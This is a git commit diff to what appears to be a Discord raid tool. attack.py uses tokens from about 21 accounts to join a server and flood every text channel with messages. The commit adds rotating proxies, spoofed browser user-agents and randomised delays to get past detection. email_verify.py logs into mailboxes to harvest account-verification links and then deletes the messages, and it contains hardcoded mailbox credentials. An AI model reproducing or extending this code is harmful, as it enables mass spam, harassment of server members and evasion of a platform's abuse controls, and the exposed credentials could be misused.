b320504622d890bf579279cf40a8adf9b64953a2
obby <freesource@freesource.com>
2017-05-25 17:48:16 -0700

    lol

--- attack.py
+++ attack.py
@@ -18,16 +18,16 @@ class spammer:
 		self.messageContent = message
 		self.uid = uid		
 		self.channel = channel
-		
+		self.sent = 0
 		self.channels = []
-		self.proxy = 'http://gw.proxies.online:8081'
+		self.proxy = choice(['http://us1.proxies.online:8182', 'http://gw.proxies.online:8081', 'http://gw.proxies.online:8104', 'http://gw.proxies.online:8100', 'http://gw.proxies.online:8101', 'http://gw.proxies.online:8102', 'http://gw.proxies.online:8103'])
 		self.message = '{message} {random}'
 
 		return
 
 	async def start(self):
 		headers = {
-			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
+			'User-Agent': choice(['Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0', 'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A']),
 			'Content-Type': 'application/json',
 			'Authorization': self.token,
 		}
@@ -39,7 +39,7 @@ class spammer:
 				async with ClientSession(headers=headers, connector=connector) as session:
 					self.joinJSON = await self.joinServer(session)
 					self.guildID = self.joinJSON['guild']['id']
-
+ 
 					if self.uid:
 						self.meID = await self.getMeID(session)
 						await self.createPMChannel(session)
@@ -51,11 +51,19 @@ class spammer:
 			except:
 				continue
 
+	async def leaveServer(self, session):
+		async with session.delete('https://discordapp.com/api/v6/users/@me/guilds/{0}'.format(self.guildID)) as request:
+			try:
+				resp = await request.read()
+				return resp
+			except:
+				return False
+
+
 	async def createPMChannel(self, session):
 		async with session.post(
 			'https://discordapp.com/api/v6/users/{0}/channels'.format(self.meID), 
 				data=json.dumps({'recipients': [self.uid]}),
-				headers={'Content-Type': 'application/json'}, 
 				proxy=self.proxy
 			) as resp:
 			resp = await resp.json()
@@ -74,21 +82,39 @@ class spammer:
 			) as request:
 			resp = await request.json()
 			for channel in resp:
+				if channel['type'] == 'voice':
+					continue
 				self.channels.append(channel['id'])
 			return resp
 
 	async def attackAllChannels(self, session):
-		for i in range(25):
+		for i in range(15):
+			await self.joinServer(session)
 			for cID in self.channels:
 				self.messageSent = await self.sendMessage(session, cID)
-				print(self.messageSent)
-			await asyncio.sleep(choice([0.1, 0.2, 0.3]))
+				try:
+					if self.messageSent['code']:
+						print('[+] Flagged for verification, exiting.')
+					return
+				except:
+					pass
+
+				try:
+
+
+					if not self.messageSent['nonce']:
+						self.sent += 1
+						print('[+] Messages Sent: {0}'.format(self.sent))
+				except:
+					pass
+				await self.humanSleep()
+			await self.humanSleep()
+		#await self.leaveServer(session)
 
 	async def sendMessage(self, session, cID):
 		async with session.post(
 			'https://discordapp.com/api/v6/channels/{0}/messages'.format(cID), 
 				proxy=self.proxy, 
-				headers={'Content-Type': 'application/json'},
 				data=json.dumps({'content': self.message.format(random=self.generateSomeRandomCharacters(), message=self.messageContent)}),
 			) as request:
 			resp = await request.json()
@@ -102,8 +128,11 @@ class spammer:
 			resp = await request.json()
 			return resp
 
+	async def humanSleep(self):
+		return await asyncio.sleep(random.uniform(0.0, 0.2))
+
 	def generateSomeRandomCharacters(self):
-		return ''.join(random.choice(string.ascii_lowercase) for _ in range(randint(1,2)))
+		return ''.join(random.choice(string.ascii_lowercase) for _ in range(randint(0,6)))
 
 async def main(invite, message, channel, uid, tasks=[]):
 	if '/' in invite:
@@ -112,13 +141,12 @@ async def main(invite, message, channel, uid, tasks=[]):
 	accounts = open('accounts.txt', 'r').readlines()
 	shuffle(accounts)
 
-	for account in accounts[0:24]:
+	for account in accounts[0:21]:
 		try:
 			username, password, email, token = account.strip().rstrip().split(':')
 		except ValueError:
 			continue
 		tasks.append(asyncio.ensure_future(spammer(token=token, message=message, invite=invite, uid=uid).start()))
-		await asyncio.sleep(choice([0.1, 0.2, 0.3]))
 	
 	await asyncio.gather(*tasks)
 
@@ -128,4 +156,10 @@ def nonMain(message, invite, channel, uid):
 
 if __name__ == "__main__":
 	loop = asyncio.new_event_loop()
-	loop.run_until_complete(main('https://discord.gg/XhyNRT', 'test', 'all', None))
+	if len(sys.argv) < 1:
+		sys.exit(0)
+	try:
+		uid = sys.argv[2]
+	except:
+		uid = None
+	loop.run_until_complete(main(sys.argv[1], open('message.txt', 'r').read(), 'all', uid))
--- email_verify.py
+++ email_verify.py
@@ -5,12 +5,12 @@ from time import sleep
 
 verificationUrls = []
 mails = [
-	['allfordiscord@gmail.com', 'apple123lol'],
+	['neko@nulled.systems', '471!T1Z%6Y12Nyj'],
 ]
 
 for email in mails:
 	email, password = email
-	mail = imaplib.IMAP4_SSL('imap.gmail.com')
+	mail = imaplib.IMAP4_SSL('nulled.systems',993)
 	print('Attempting: {0}'.format(email))
 	try:
 		mail.login(email, password)
@@ -31,10 +31,10 @@ for email in mails:
 			b = b[1].decode('utf-8')
 		except:
 			continue
-		verificationUrls.append(str(b).split('<a href="')[2].split('"')[0])
+		verificationUrls.append(str(b).split('<a href="')[2].split('"')[0].split('=')[1])
 
-	#mail.uid('STORE', ','.join(iterData) , '+FLAGS', '(\Deleted)')  
-	#mail.expunge() 
+	mail.uid('STORE', ','.join(iterData) , '+FLAGS', '(\Deleted)')  
+	mail.expunge() 
 
 	print('Parsed: {0}'.format(email))
 
